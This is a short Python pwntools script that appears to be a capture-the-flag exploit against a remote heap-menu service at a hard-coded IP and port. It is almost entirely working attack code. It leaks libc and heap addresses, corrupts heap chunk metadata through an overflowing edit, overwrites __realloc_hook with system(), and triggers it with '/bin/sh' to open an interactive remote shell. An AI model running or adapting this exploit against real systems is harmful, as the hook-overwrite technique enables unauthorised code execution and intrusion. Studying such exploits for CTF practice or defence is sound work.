#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
#host = "10.211.55.13"
#port = 8888
host = "178.128.87.12"
port = 31336
r = remote(host,port)

def new(name,size,data):
    r.recvuntil("⛩")
    r.sendline("1")
    r.recvuntil("Name :")
    r.sendline(name)
    r.recvuntil("?")
    r.sendline(str(size))
    r.recvuntil(":\n")
    r.sendline(data)

def show():
    r.recvuntil("⛩")
    r.sendline("2")
    #r.recvuntil(">")
    r.sendline("100")

def edit(idx,name,size,data):
    r.recvuntil("⛩")
    r.sendline("2")
    r.recvuntil(">")
    r.sendline(str(idx))
    r.recvuntil("?")
    r.sendline(name)
    r.recvuntil("?")
    r.sendline(str(size))
    time.sleep(0.1)
    r.sendline(data)

def free(idx):
    r.recvuntil("⛩")
    r.sendline("3")
    r.recvuntil(">")
    r.sendline(str(idx))


new("orange",128,"dada")
new("2312",128,"dada")
new("lays",128,"")
show()
r.recvuntil("lays")
r.recvuntil(":\n")
libc = u64(r.recvuntil("128")[2:10]) - 0x3c1b00
print hex(libc)
free(3)
new("lays",128,"gg")
new("meh",128,"gg")
new("meh",128,"gg")
arena = libc + 0x3c1b60
edit(1,"ggwp",130,"a"*132 + p64(0x21) + p64(arena)*2 + p64(0)   + p64(0x71))
show()
r.recvuntil("meh")
r.recvuntil("Name : ")
heap = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x180
print hex(heap)
realloc_hook = libc + 0x3c1ae8
size = libc + 0x3c1b28
edit(1,"ggwp",131,"a"*132 + p64(0x21) + p64(size)*2 + p64(0)   + p64(0x71))
edit(5,p32(280),128,"da")
edit(1,"/bin/sh\x00",132,"a"*132 + p64(0x21) + p64(realloc_hook)*2 + p64(0)   + p64(0x71))
system = libc + 0x456a0
edit(5,p64(system),256,"a"*4)
r.recvuntil("⛩")
r.sendline("2")
r.recvuntil(">")
r.sendline("1")
r.recvuntil("?")
r.sendline("/bin/sh")
r.recvuntil("?")
r.sendline("1000")
r.interactive()

